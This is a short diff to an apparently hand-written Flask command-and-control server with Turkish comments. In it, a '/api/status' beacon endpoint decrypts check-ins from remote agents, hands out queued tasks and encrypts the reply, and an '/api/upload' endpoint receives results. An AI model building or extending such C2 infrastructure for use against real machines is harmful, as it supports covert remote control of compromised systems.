@@ -10,17 +10,18 @@ tasks = {}
 @app.route('/api/status', methods = ['POST'])
 def beacon():
     #json verisi şifreli geliyor
-    encrypted = request.json.get('data')
-    decrypted_json = decrypt_data(encrypted)
+    encryped = request.json.get('data')
+    decrypted_json= decrypt_data(encryped)
     beacon_info = json.loads(decrypted_json)
 
+    agent_id = beacon_info.get('id')
 
-    agent_id = beacon_info.json.get('id')
-    if agent_id in tasks and tasks[agent_id]:
-        task = tasks[agent_id].pop(0)
-        return jsonify({"task": task})
-    else:
-        return jsonify({"task": None})
+    task = tasks.pop(agent_id,None)
+    response = {"task":task} if task else {"task":None}
+
+    # once python nesnesını jsona çevirdik sonra sifreledik.
+    encrypted_response = Encryption.encrypt_data(json.dumps(response))
+    return jsonify({"data":encrypted_response})
 
 @app.route('/api/upload', methods= ['POST'])
 def result():
